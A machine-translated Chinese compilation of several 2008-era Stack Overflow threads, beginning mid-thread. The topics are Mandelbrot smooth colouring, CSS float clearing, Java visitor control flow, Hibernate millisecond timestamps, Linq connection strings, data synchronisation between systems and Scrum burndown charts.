这是一个简单的 Mandelbrot 生成器的典型内部循环。要获得平滑的颜色，您需要传递真实和复杂的“长度”以及您退出的迭代。我已经包含了 Mandelbrot 代码，因此您可以查看使用哪些变量来计算颜色。

```
for (ix = 0; ix < panelMain.Width; ix++)
    {
    cx = cxMin + (double )ix * pixelWidth;
    // init this go 
    zx = 0.0;
    zy = 0.0;
    zx2 = 0.0;
    zy2 = 0.0;
    for (i = 0; i < iterationMax && ((zx2 + zy2) < er2); i++)
        {
        zy = zx * zy * 2.0 + cy;
        zx = zx2 - zy2 + cx;
        zx2 = zx * zx;
        zy2 = zy * zy;
        }
    if (i == iterationMax)
        {
        // interior, part of set, black
        // set colour to black
        g.FillRectangle(sbBlack, ix, iy, 1, 1);
        }
    else
        {
        // outside, set colour proportional to time/distance it took to converge
        // set colour not black
        SolidBrush sbNeato = new SolidBrush(MapColor(i, zx2, zy2));
        g.FillRectangle(sbNeato, ix, iy, 1, 1);
        } 
```

和下面的 MapColor ：（请参阅[此链接以获取 ColorFromHSV 函数](https://stackoverflow.com/questions/1335426/is-there-a-built-in-c-net-system-api-for-hsv-to-rgb)）

```
 private Color MapColor(int i, double r, double c)
                {
                double di=(double )i;
                double zn;
                double hue;

                    zn = Math.Sqrt(r + c);
                    hue = di + 1.0 - Math.Log(Math.Log(Math.Abs(zn))) / Math.Log(2.0);  // 2 is escape radius
                    hue = 0.95 + 20.0 * hue; // adjust to make it prettier
                    // the hsv function expects values from 0 to 360
                    while (hue > 360.0)
                        hue -= 360.0;
                    while (hue < 0.0)
                        hue += 360.0;

                    return ColorFromHSV(hue, 0.8, 1.0);
                } 
```

MapColour 正在“平滑”从 0 到 1 的救助值，然后可用于映射颜色而不会出现可怕的条纹。使用 MapColour 和/或 hsv 函数可以让您更改使用的颜色。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-12-15T20:00:38.533

通过反复试验似乎很简单。假设您可以定义您希望使用的端点颜色（黑色和白色；蓝色和黄色；深红色和浅绿色等）的 HSV1 和 HSV2（色调、饱和度、值），并假设您有一个算法来分配每个像素的值 P 介于 0.0 和 1.0 之间。然后那个像素的颜色变成

```
(H2 - H1) * P + H1 = HP
(S2 - S1) * P + S1 = SP
(V2 - V1) * P + V1 = VP 
```

完成后，只需观察结果，看看你喜欢它们。如果分配 P 的算法是连续的，那么梯度也应该是平滑的。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-12-17T10:52:53.987

我最终的解决方案是创建一个漂亮（且相当大）的调色板并将其作为常量数组存储在源中，然后使用平滑着色算法在其中的索引之间进行插值。调色板包裹（并且被设计为连续的），但这似乎并不重要。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-04-04T17:42:56.410

该图像中的颜色映射发生了什么是它在索引上使用“对数传递函数”（根据文档）。它到底是怎么做的，我还没有弄清楚。生成它的程序使用 400 种颜色的调色板，因此索引范围为 [0,399)，如果需要，可以环绕。我已经设法非常接近匹配它的行为。我使用 [0,1) 的索引范围并像这样映射它：

```
 double value = Math.log(0.021 * (iteration + delta + 60)) + 0.72;
    value = value - Math.floor(value); 
```

我必须在其中使用这些特殊常量来使我的结果匹配，这有点奇怪，因为我怀疑它们会做任何事情。但最终不管怎样，对吧？

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2016-06-21T10:03:35.357

在这里你可以找到一个带有 javascript 的版本

用法 ：

```
var rgbcol = [] ;
var rgbcol = MapColor ( Iteration , Zy2,Zx2 ) ;
point ( ctx , iX, iY ,rgbcol[0],rgbcol[1],rgbcol[2] ); 
```

功能

```
/*
 * The Mandelbrot Set, in HTML5 canvas and javascript.
 * https://github.com/cslarsen/mandelbrot-js
 *
 * Copyright (C) 2012 Christian Stigen Larsen
*/

/*
 * Convert hue-saturation-value/luminosity to RGB.
 *
 * Input ranges:
 *   H =   [0, 360] (integer degrees)
 *   S = [0.0, 1.0] (float)
 *   V = [0.0, 1.0] (float)
 */
function hsv_to_rgb(h, s, v)
{
  if ( v > 1.0 ) v = 1.0;
  var hp = h/60.0;
  var c = v * s;
  var x = c*(1 - Math.abs((hp % 2) - 1));
  var rgb = [0,0,0];

  if ( 0<=hp && hp<1 ) rgb = [c, x, 0];
  if ( 1<=hp && hp<2 ) rgb = [x, c, 0];
  if ( 2<=hp && hp<3 ) rgb = [0, c, x];
  if ( 3<=hp && hp<4 ) rgb = [0, x, c];
  if ( 4<=hp && hp<5 ) rgb = [x, 0, c];
  if ( 5<=hp && hp<6 ) rgb = [c, 0, x];

  var m = v - c;
  rgb[0] += m;
  rgb[1] += m;
  rgb[2] += m;

  rgb[0] *= 255;
  rgb[1] *= 255;
  rgb[2] *= 255;

  rgb[0] = parseInt ( rgb[0] ); 
  rgb[1] = parseInt ( rgb[1] );
  rgb[2] = parseInt ( rgb[2] );  

  return rgb;
}

// http://stackoverflow.com/questions/369438/smooth-spectrum-for-mandelbrot-set-rendering
// alex russel : http://stackoverflow.com/users/2146829/alex-russell

function MapColor(i,r,c)
{
    var di= i;
    var zn;
    var hue;

        zn = Math.sqrt(r + c);
        hue = di + 1.0 - Math.log(Math.log(Math.abs(zn))) / Math.log(2.0);  // 2 is escape radius
        hue = 0.95 + 20.0 * hue; // adjust to make it prettier
        // the hsv function expects values from 0 to 360
        while (hue > 360.0)
            hue -= 360.0;
        while (hue < 0.0)
            hue += 360.0;

        return hsv_to_rgb(hue, 0.8, 1.0);
} 
```

# html - 使用 CSS 将浮动图像保留在 div 内

> ID：369448
> 
> 赞同：18
> 
> 时间：2008-12-15T19:31:05.627
> 
> 标签：html, css

我遇到了这个问题，和以前一样，但从来没有尝试找到*正确*的解决方案

代码：

```
 <div id="ListOfTextAndPhotos">
      <div style="border-bottom: solid 1px silver;">
          <img src="photo.jpg" style="float: left">
          Some text about the photo
      </div>
      <div style="border-bottom: solid 1px silver;">
          <img src="photo2.jpg" style="float: left">
          Some text about the photo2
      </div>
      <div style="border-bottom: solid 1px silver;">
          <img src="photo3.jpg" style="float: left">
          Some text about the photo3
      </div>
  </div> 
```

问题： **如何将照片保存在 DIV 中？**照片下方有分隔线

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2008-12-15T19:43:04.573

更传统的方法（除了清除）是将包含 div 的溢出属性设置为隐藏。

```
<div style="border-bottom: solid 1px silver; overflow: hidden;">
      <img src="photo3.jpg" style="float: left">
      <div>Some text about the photo3</div>
</div> 
```

有时，IE6 不支持该设置，您必须求助于 cLFlaVA hack。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-15T19:35:19.083

浮动元素将其从文档流中取出，因此在屏幕上渲染时不会占用一般流中的空间。还有其他处理方法，但这里有一个 hack：

```
 <div id="ListOfTextAndPhotos">
      <div style="border-bottom: solid 1px silver;">
          <img src="photo.jpg" style="float: left">
          <div style="clear:both;">Some text about the photo</div>
      </div>
      <div style="border-bottom: solid 1px silver;">
          <img src="photo2.jpg" style="float: left">
          <div style="clear:both;">Some text about the photo2</div>
      </div>
      <div style="border-bottom: solid 1px silver;">
          <img src="photo3.jpg" style="float: left">
          <div style="clear:both;">Some text about the photo3</div>
      </div>
  </div> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-15T19:34:29.693

一种快速而肮脏的方法是将包含的 div 也浮动。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-15T22:08:39.647

添加`<div style="clear:both;"></div>`是一个完整的技巧，会扼杀你在以后改变主意的能力。正确的解决方案是使用带有`overflow: hidden;`or的纯 css `zoom: 1;`。

但是，除了添加 overflow: hidden 之外，还有更多内容，因为您还需要确保包含块也具有宽度属性。

我还想指出，在上述问题和批准的答案中，如果立即告诉文本清除它，那么首先浮动图像的意义何在？

[http://www.quirksmode.org/css/clearing.html](http://www.quirksmode.org/css/clearing.html)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-12T18:49:23.880

我在这里遇到了类似的问题，我的图像溢出了我的 div：

<div id="offer"> <div class="inner"> <img src="offer.png" alt="">

我必须让我的图像浮动：对；这样文本就会出现在它的左侧并填充空间。我不知道为什么它会像那样溢出，但是 tj111 的“快速而肮脏”的制作 #offer{float: left/right/upmycornhole;} 的方法完全解决了这个问题，并且没有重新定位 div包含的 div 位于一个包装器内，该包装器将其固定在页面上。

谢谢tj你是一个救生员！！！

# java - Java：使用 RuntimeException 从访客中逃脱

> ID：369452
> 
> 赞同：10
> 
> 时间：2008-12-15T19:32:16.483
> 
> 标签：java, exception, visitor-pattern, callcc

我非常想在 Java 程序中使用未经检查的异常作为短路控制流结构。我希望这里有人可以建议我以更好，更清洁的方式来处理这个问题。

这个想法是我想缩短访问者对子树的递归探索，而不必在每个方法调用中检查“停止”标志。具体来说，我正在使用抽象语法树上的访问者构建控制流图。AST 中的一条`return`语句应该停止对子树的探索，并将访问者发送回最近的封闭 if/then 或循环块。

超`Visitor`类（来自[XTC 库](http://cs.nyu.edu/rgrimm/xtc/)）定义

```
Object dispatch(Node n) 
```

通过形式的反射方法回调

```
Object visitNodeSubtype(Node n) 
```

`dispatch`没有声明抛出任何异常，所以我声明了一个扩展的私有类`RuntimeException`

```
private static class ReturnException extends RuntimeException {
} 
```

现在，return 语句的访问者方法看起来像

```
Object visitReturnStatement(Node n) {
    // handle return value assignment...
    // add flow edge to exit node...
    throw new ReturnException();
} 
```

每个复合语句都需要处理`ReturnException`

```
Object visitIfElseStatement(Node n) {
  Node test = n.getChild(0);
  Node ifPart = n.getChild(1);
  Node elsePart = n.getChild(2);

  // add flow edges to if/else... 

  try{ dispatch(ifPart); } catch( ReturnException e ) { }
  try{ dispatch(elsePart); } catch( ReturnException e ) { }
} 
```

这一切都很好，除了：

1.  我可能会忘记在`ReturnException`某个地方捕获，编译器不会警告我。
2.  我觉得脏。

有一个更好的方法吗？是否有一种我不知道的 Java 模式来实现这种非本地控制流？

[更新] 这个特定的例子有些无效：`Visitor`超类捕获并包装异常（甚至`RuntimeException`s），所以抛出异常并没有真正的帮助。我已经实施了`enum`从`visitReturnStatement`. 幸运的是，这只需要在少数地方进行检查（例如，`visitCompoundStatement`），因此它实际上比抛出异常要少一些麻烦。

总的来说，我认为这仍然是一个有效的问题。虽然也许，如果您不依赖于第三方库，则可以通过明智的设计避免整个问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-15T19:56:42.893

我认为这是一种合理的方法，原因如下：

*   您正在使用第 3 方并且无法添加已检查的异常
*   在大量访问者中到处检查返回值时只需要在少数人中进行检查是不必要的负担

此外，有些人认为[未经检查的异常并没有那么糟糕](http://www.ibm.com/developerworks/library/j-jtp05254.html)。您的使用让我想起了 Eclipse 的[OperationCanceledException](http://help.eclipse.org/help32/index.jsp?topic=/org.eclipse.platform.doc.isv/reference/api/org/eclipse/core/runtime/OperationCanceledException.html)，它用于清除长时间运行的后台任务。

它并不完美，但是，如果有据可查，对我来说似乎没问题。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-16T05:48:42.853

将运行时异常作为控制逻辑抛出绝对是一个坏主意。您感到肮脏的原因是您绕过了类型系统，即您的方法的返回类型是一个谎言。

你有几个更干净的选择。

**1.异常函子**

一个很好的技术，当你被限制在你可能抛出的异常中时，如果你不能抛出一个检查异常，返回一个将抛出一个检查异常的对象。例如，java.util.concurrent.Callable 就是这个函子的一个实例。

[有关此技术的详细说明，请参见此处。](http://apocalisp.wordpress.com/2008/05/16/thrower-functor/)

例如，而不是这个：

```
public Something visit(Node n) {
  if (n.someting())
     return new Something();
  else
     throw new Error("Remember to catch me!");
} 
```

做这个：

```
public Callable<Something> visit(final Node n) {
  return new Callable<Something>() {
    public Something call() throws Exception {
      if (n.something())
         return new Something();
      else
         throw new Exception("Unforgettable!");
    }
  };
} 
```

**2\. Disjoint Union（又名 The Either Bifunctor）**

此技术允许您从同一方法返回两种不同类型中的一种。这有点像`Tuple<A, B>`大多数人熟悉的从方法返回多个值的技术。但是，这不是返回类型 A 和 B 的值，而是返回类型 A 或 B 的单个值。

例如，给定一个枚举失败，它可以枚举适用的错误代码，示例变为......

```
public Either<Fail, Something> visit(final Node n) {
  if (n.something())
    return Either.<Fail, Something>right(new Something());
  else
    return Either.<Fail, Something>left(Fail.DONE);
} 
```

现在拨打电话更干净了，因为您不需要 try/catch：

```
Either<Fail, Something> x = node.dispatch(visitor);
for (Something s : x.rightProjection()) {
  // Do something with Something
}
for (Fail f : x.leftProjection()) {
  // Handle failure
} 
```

Either 类编写起来并不难，但是[Functional Java 库提供了一个功能齐全的实现](http://functionaljava.org/)。

**3\. 选项单子**

有点像类型安全的 null，当您不想为某些输入返回值但不需要异常或错误代码时，这是一种很好的技术。通常，人们会返回所谓的“哨兵值”，但 Option 相当干净。

你现在有...

```
public Option<Something> visit(final Node n) {
  if (n.something())
    return Option.some(new Something());
  else
    return Option.<Something>none();
} 
```

电话很干净：

```
Option<Something> s = node.dispatch(visitor));
if (s.isSome()) {
  Something x = s.some();
  // Do something with x.
}
else {
  // Handle None.
} 
```

[而且它是一个monad](https://stackoverflow.com/questions/44965/what-is-a-monad)的事实使您可以在不处理特殊 None 值的情况下链接调用：

```
public Option<Something> visit(final Node n) {
  return dispatch(getIfPart(n).orElse(dispatch(getElsePart(n)));
} 
```

Option 类比 Either 更容易编写，但[功能性 Java 库同样提供了一个功能齐全的实现](http://functionaljava.org/)。

[有关 Option 和 Either 的详细讨论，请参见此处。](http://apocalisp.wordpress.com/2008/06/04/throwing-away-throws/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T19:35:57.880

您是否有理由不只是返回一个值？比如NULL，如果你真的想什么都不返回？这会简单得多，并且不会冒险引发未经检查的运行时异常。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T19:47:44.237

我为您看到以下选项：

1.  继续定义那个`RuntimeException`子类。通过在最一般的调用中捕获您的异常`dispatch`并报告该异常来检查是否存在严重问题。
2.  如果它认为搜索应该突然结束，让节点处理代码返回一个特殊对象。这仍然迫使您检查返回值而不是捕获异常，但您可能更喜欢这种方式的代码外观。
3.  如果树遍历因某些外部因素而停止，请在子线程内完成所有操作，并在该对象中设置一个同步字段，以便告诉线程过早停止。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-15T20:11:13.847

你为什么要从访问者那里返回一个值？访问者的适当方法由正在访问的类调用。所有完成的工作都封装在访问者类本身中，它不应该返回任何内容并处理它自己的错误。调用类所需的唯一义务是调用适当的 visitXXX 方法，仅此而已。（这假设您在示例中使用重载方法，而不是为每种类型覆盖相同的 visit() 方法）。

访问的类不应被访问者更改或必须知道它的作用，除非它允许访问发生。返回值或抛出异常将违反这一点。

[访客模式](http://sourcemaking.com/design_patterns/visitor)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-15T20:46:49.920

您必须使用来自 XTC 的访客吗？这是一个非常简单的接口，您可以实现自己的接口，它可以抛出已**检查**的ReturnException，您不会忘记在需要的地方捕获它。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-15T22:04:05.710

我没有使用你提到的 XTC 库。它如何提供访问者模式的补充部分——`accept(visitor)`节点上的方法？即使这是一个基于反射的调度程序，仍然必须有一些东西可以处理语法树的递归？

如果这个结构迭代代码很容易访问，并且您还没有使用方法的返回值，您`visitXxx(node)`是否可以利用一个简单的枚举返回值，甚至是一个布尔标志，告诉`accept(visitor)`不要递归到子节点？

如果：

*   `accept(visitor)`不是由节点显式实现的（有一些字段或访问器反射正在进行，或者节点只是为某些标准控制流逻辑实现子获取接口，或出于任何其他原因......），并且

*   你不想弄乱库的结构迭代部分，或者它不可用，或者不值得努力......

那么作为最后的手段，我猜想异常可能是您在使用 vanilla XTC 库时唯一的选择。

不过，这是一个有趣的问题，我可以理解为什么基于异常的控制流会让你感到肮脏​​……

# java - 如何将休眠时间戳映射到 MySQL BIGINT？

> ID：369460
> 
> 赞同：1
> 
> 时间：2008-12-15T19:34:41.550
> 
> 标签：java, mysql, hibernate, orm, jdbc

我正在使用 Hibernate 3.x、MySQL 4.1.20 和 Java 1.6。我将 Hibernate Timestamp 映射到 MySQL TIMESTAMP。到现在为止还挺好。问题是 MySQL 以秒为单位存储 TIMESTAMP 并丢弃毫秒，我现在需要毫秒精度。我想我可以在我的表中使用 BIGINT 而不是 TIMESTAMP 并转换我的 Java 代码中的类型。我试图弄清楚是否有更好的方法使用休眠、mysql、JDBC 或某种组合来执行此操作，以便我仍然可以在我的 HSQL 和/或 SQL 查询中使用日期函数？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-16T13:39:13.997

另外，看看创建一个自定义的 Hibernate Type 实现。类似于（伪代码，因为我没有方便的环境来使其防弹）：

```
public class CalendarBigIntType extends org.hibernate.type.CalendarType {
    public Object get(ResultSet rs, String name) {
        return cal = new GregorianCalendar(rs.getLong(name));
    }
    public void set(PreparedStatement stmt, Object value, int index) {
        stmt.setParameter(index, ((Calendar) value).getTime());
    }
} 
```

然后，您需要使用休眠的 TypeDef 和 Type 映射来映射您的新对象。如果您使用的是 Hibernate 注释，则应遵循以下原则：

```
@TypeDef (name="bigIntCalendar", typeClass=CalendarBigIntType.class)
@Entity
public class MyEntity {
    @Type(type="bigIntCalendar")
    private Calendar myDate;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-23T21:49:19.510

对于那些仍然对此问题感兴趣的人：MySQL 5.6.4 支持精确的时间戳。将 MySQL5Dialect 子类化以覆盖使用的 MySQL 类型可以解决问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T19:39:50.977

除了 TIMESTAMP 字段之外，为什么不使用它呢？您将有一个字段（已定义）用于存储日期，没有毫秒，另一个字段用于毫秒。您仍然可以在第一个字段上运行 HSQL 查询，除非您必须确保正确存储毫秒（通过在使用 Hibernate 存储它之前解析 Java Date 对象）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2010-08-11T23:12:58.000

我将我的数据类型从时间戳更改为十进制（17,3）并编写了一些辅助方法

```
public static Calendar bigDec2Cal(BigDecimal tsp) {
    Calendar cal = Calendar.getInstance();
    cal.setTimeInMillis(tsp.longValue());
    return cal;
}

public static Date bigDec2Date(BigDecimal tsp) {
    Calendar cal = Calendar.getInstance();
    cal.setTimeInMillis(tsp.longValue());
    return cal.getTime();
}

public static BigDecimal cal2BigDec(Calendar cal) {
    BigDecimal tsp = new BigDecimal(cal.getTimeInMillis());
    return tsp;
}

public static BigDecimal date2BigDec(Date date) {
    Calendar cal = Calendar.getInstance();
    cal.setTime(date);
    BigDecimal tsp = new BigDecimal(cal.getTimeInMillis());
    return tsp;
} 
```

# c# - 在 Linq DataContext 的连接字符串中强制使用完整路径

> ID：369462
> 
> 赞同：0
> 
> 时间：2008-12-15T19:34:57.290
> 
> 标签：c#, visual-studio-2008, linq, substitution

我正在使用 System.Data.Linq.DataContext 文件来访问 mdf 数据库

我想使用项目目录中的数据库，而不是调试器在 Debug 目录中创建的数据库。

问题是当我编辑连接字符串并选择 AttachDBFilename 的路径时，VS2008 会自动将我的项目目录替换为“|DataDirectory|”

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T23:28:56.130

编辑您的应用程序“app.config”文件
转到 connectionStrings 并将 connectionString 更改为您的数据库的路径。

在 DataContext 文件属性中，设置“应用程序设置”= True
然后通过它的名称和它选择连接。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2011-05-12T20:40:52.893

你已经可以这样写了： SampledbDataContext sdc = new SampledbDataContext(Server.MapPath("~/Sampledb.mdf")); 或在 design.cs 文件中 public SampledbDataContext() : base(global::"[write cnn string Here !]", mappingSource) { OnCreated(); }

# synchronization - 在解耦系统之间同步数据的最佳方式是什么？

> ID：369464
> 
> 赞同：5
> 
> 时间：2008-12-15T19:35:04.823
> 
> 标签：synchronization, eai, application-integration

我假设有 2 个（但将来会变得更多）完全解耦的系统：系统 A 和系统 B。

假设每个系统上的每条信息都有一个informationID。没有什么可以阻止 informationID 在不同系统上相同。在所有系统中唯一标识一条信息的是 Source-informationID 对。

假设我需要将一条信息从系统 A 导出到系统 B。然后我想从系统 B 导出相同的信息并将其重新导入系统 A，我需要能够识别出相同的信息的信息。

根据人们的经验，这样做的最佳方式是什么？

这就是我想做的事情：

1.  在具有消息队列的系统之间设置消息总线。
2.  为每个系统设置端点，这些端点将监视更改并生成包含在消息中的命令，这些消息将被泵入队列（例如，当一条信息被创建/删除/更新时）。
3.  将等级分配给与创建/删除/更新命令相关的端点，以便不依赖系统名称，而仅依赖一般层次结构 - 这样每个系统都不需要了解其他系统。
4.  为每个端点分配更新/删除/创建命令的阈值，以便将不满足阈值要求的命令过滤掉并且不进行处理

这并不能解决我仍然需要携带 originalSource+originalSourceID 的事实。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-31T02:38:04.070

正如有人已经写过的，这听起来像是一个典型的 EAI 问题。即使 EAI 工具过去很昂贵，现在也有多种免费的开源工具可供选择。下面是我最喜欢的列表

1.  [OpenESB](http://open-esb.org/)
2.  [骡子](http://www.mulesource.org/)
3.  [阿帕奇服务组合](http://servicemix.apache.org/home.html)
4.  [阿帕奇骆驼](http://camel.apache.org/)

我最喜欢的是 OpenESB，我最了解它，它有一个完整的 IDE（Netbeans）、来自大供应商的可选支持和[大量的附加组件](https://open-esb.dev.java.net/Components.html)。由于它的简单性和有效性，我喜欢 Apache Camel，但您可以尝试其中的一些并决定哪一个更适合您。然后，您甚至可以决定为所有这些购买支持服务。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-15T20:42:13.707

此问题已由[Tibco](http://tibco.com/)和[webMethods等 EAI（企业应用程序集成）供应商解决](http://www.softwareag.com/Corporate/products/wm/default.asp)（现在是 Software AG 的一部分）。我以前从未使用过 Tibco，但我使用过 webMethods 来解决这类问题，所以我将只关注 webmethods。例如，在企业中，有关员工的数据可能同时存在于 Active Directory 和 PeopleSoft 中。webMethods 可用于确保一个系统（应用程序）中的更改、添加、删除将实时反映在另一个系统（应用程序）中。在其他一些组织中，有关员工的数据也可能位于 Oracle 或 SQL Server 数据库中。再次，不是问题。这些 EAI 工具（如 webMethods）可以与各种后端通信。webMethods 并不局限于单一来源和单一目标，而是因为它具有发布-订阅架构，来自单一来源的数据可以流向订阅特定信息的多个感兴趣的目标。在这些产品中可以找到保证交付和可能的其他功能。回到员工的例子，最终，如果做对了，在任何给定时间，企业中的所有系统和应用程序都可以包含有关员工的相同信息，而不会出现任何差异。

因此，您无需使用 C# 或 Java 进行编程，而是使用非常类似于 4GL 语言的 webMethods 编程。我称它为编程是因为仍然涉及逻辑、循环、if then else、分支、变量、包等，但它非常面向过程，即根本没有 OOP 的概念。

这些 EAI 工具的构建考虑了有限的目的，其中一个目的是在企业中的不同系统之间轻松同步数据。他们做得很好。

缺点是这些工具要花很多钱。公司在投资这些工具之前通常有一个长期战略。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-15T21:00:34.807

我们正在做的事情几乎与您描述的 A -> B -> A 完全一样。我们最初考虑尝试让所有 A、B、C 等节点成为对等节点，但这太难了，所以我们现在指定一个为主节点，其他节点为副本。从一个副本到另一个副本仍然很容易，但通过主副本。

这一切都是通过 Web 服务完成的——数据集从副本到主数据库上下移动，反之亦然，副本在其自身上运行导出，并在主数据库上调用导入。然后它告诉主节点进行导出，并在其自身上运行导入。

因此，每个系统上的代码都是相同的。只有复制品才是家。

导出和导入过程告诉相关业务对象完成所有列出和保存的工作，因为它们已经知道如何从 DataRows 实例化和持久化自己。

它不是每秒数十个事务的架构，但它可以工作，并且可以实现近乎实时的同步。

顺便说一下，我们还没有改进 Source/Id 的唯一性:)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-31T02:50:47.553

如果您为每条信息分配一个 GUID，这将大大简化。如果您需要跟踪源 ID 和其他 ID，这很好，但信息应该始终使用其分配的 GUID。

当机器再次看到该信息时，它会看到 GUID 并将其与现有数据相关联，然后您可以决定要做什么。但是您已经知道它是相同的数据块 - 只是更好地旅行。

请记住，GUID 的创建方式是每台机器都将创建自己的，并且它们不会与在另一台机器上创建的 GUID 或在不同时间在同一台机器上创建的 GUID 冲突（出于所有实际意图和目的）。

这是创建 GUID 的重要原因之一。

-亚当

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-15T20:15:38.487

除非系统设计中有一些特定的限制阻止了这种情况，否则我建议将共享/可共享信息分解到一个单独的数据库中，其他两个可以引用或只是在本地复制。那么您就不需要双元素密钥，也不需要任何精致的 ESB 装置......

# task - Scrum 燃尽图：任务还是故事？

> ID：369493
> 
> 赞同：8
> 
> 时间：2008-12-15T19:46:56.017
> 
> 标签：task, scrum, user-stories, burndowncharts

在 Scrum 中有几种方法可以做燃尽图。

有些人建议使用未完成故事的故事点作为 Scrum 中的燃尽图。

**优点**：只有完成的故事才能降低图表

**对比**：图表一开始没有向下移动，然后迅速下降

其他人建议使用剩余的任务数

**Pro** : 图表会向下移动，你可以看看它是否在终点线之上

**反对者**：你可以向下移动到最后说剩下 10 个任务（困难任务），但仍然没有完成一个故事。你失败了，因为只有完成的故事才对你的产品负责人有益。

解决方案是否同时具有未完成的故事点和未完成的任务图表？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-16T20:13:47.133

我们将**剩余时间用于 sprint 燃尽**- 团队每天都可以看到进度。如果有平坦的部分，那么它们就真的发生了。

在**发布燃尽图**中，我们使用了**故事点**。发布计划更多的是关于他的功能完整性，时间是在冲刺级别上跟踪的。产品负责人对已完成的故事感兴趣。

**任务数是没用的**。这个数字每天都可以改变，特别是如果你给开发者一个“自由”。他们可以在不改变总时间的情况下将任务分成更小的部分。这样的统计是没有用的。它说明了什么？它会影响 sprint 的目标吗？

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-15T21:21:30.820

在我看来，跟踪任务是一种不太理想的跟踪方法。以我的经验，一个故事很少真的是它的任务的总和——而且通常，在实施一个故事时，我发现任务分解不是最理想的，无论如何。

而且，虽然我在评估故事时发现头脑风暴任务的价值，但我更喜欢故事足够小以至于根本没有*追踪*它们的冲动。事实上，为完成的任务而获得荣誉是高度误导的，因为即使完成了所有已识别任务的一半也不能保证 Sprint 将提供任何价值。这就是利益相关者最终感兴趣的：实际交付的预计价值有多少？

因此，跟踪故事*并进一步分解故事*既能提供更准确的反馈，又能降低无价值传递的风险。

实际上，在处理小故事时，我根本没有看到 Sprint 燃尽图有多大价值 - 只是看着卡片墙上的故事从“待做”到“进行中”再到“完成”应该给你所有您需要的信息。但是，根据我的经验，发布烧毁可能非常有价值。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-27T12:58:28.090

我们通常需要针对要求他们的客户的故事跟踪时间（估计与实际与估计完成）。这允许我们做一些事情：

1.  跟踪该客户需求的进度，以便他们的项目经理对正在发生的事情有所了解。
2.  根据所需的实际工作审查估算，以提高我们的估算能力。
3.  向客户收取实际花费的时间，以防它是按小时计费的工作的一部分。
4.  向开发人员提供有关其进度的反馈，以便他们可以适当地管理干扰。

我们还为自己的燃尽图跟踪已完成的故事，但正如已经指出的那样，这可能会导致在 sprint 开始时出现平台效应，这会告诉我们很少有用的信息（除了我们并行做得不够）。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-12-04T00:47:39.860

Burndowns（或什至“burn ups”）应该只**表示剩余的工作。**

如果你已经完成了一半的故事，你就不能发布它，这不算数。如果你以一个完成了一半的故事结束了春天——如果你正在测量速度，那么其中完成的任务就不算数。

只是图表**故事**有待完成。

这是一个更严厉的措施，但按摩数据没有用 - scrum 应该传达坏消息，以便事情得到解决。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-15T19:51:19.847

我们两者都做，就好像我们没有包括我们的生产线会以一种看起来什么都没有完成的方式停滞不前的任务。

如果一个故事需要 2 天才能完成，那么你有 2 天的平线，并且无法判断团队是否坐在他们的拇指上，或者工作增加了（因此任务时间增加了）。

当然，如果开发人员可以随意选择任务，则任务线可能会直线下降而不有助于完成故事，这是一种反模式。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-15T20:35:23.593

跟踪剩余任务的数量并不是很有帮助，因为这些任务可能具有不同的大小。

您不应该发现自己处于团队完成十个任务而没有积压项目的情况（实际上，如果您有十个开发人员，这是可能的）：每个开发人员都不应该从另一个积压项目（故事）中提取任务，直到他完成积压工作项目他所做的第一个故事也属于 - 如果另一个故事的任务比开始的sotry中的剩余任务更难，则事件。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-08-19T21:29:22.773

我用了很多“剩余时间”来进行燃尽。团队总是发现按时间跟踪燃尽与时间跟踪系统很接近，增加了管理开销，而且除非我们将人类转变为机器人，否则实际上并不准确。

我正在使用任务燃尽图（总任务、新任务、已完成任务）。好多了。确实，您看不到已完成任务或新任务的大小。但是团队每天都开会，这就是你发现问题的地方。同样，我指导团队不要创建大任务（最多 4 到 6 小时）。此外，我还添加了另一个图表，其中包含每日新任务和完成任务。团队发现任务的燃尽比使用小时更有意义。

在团队了解了在任务中分解故事的价值后，我想尝试按故事进行燃尽。因此，拥有最多 5 或 8 个故事点的小故事。来自 Jeff Sutherland 的博客，这是让团队取得高绩效的一大步。

另外，我想提一下，燃尽图只是“一目了然的进步表现”。与团队和 PO 最重要甚至更相关的是：每天提到的关于任务的内容 + 故事进度百分比 + 障碍列表。一段时间后，管理层和团队成员不再关心燃尽（或燃尽）。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2009-01-03T19:13:28.647

我们使用任务是因为它提供了更多的粒度。仅绘制故事的完成情况（我们每两周 sprint 绘制 5-10 个）只会显示每一两天的变化，并且正如您所提到的，在 sprint 开始时根本不会有太大变化。

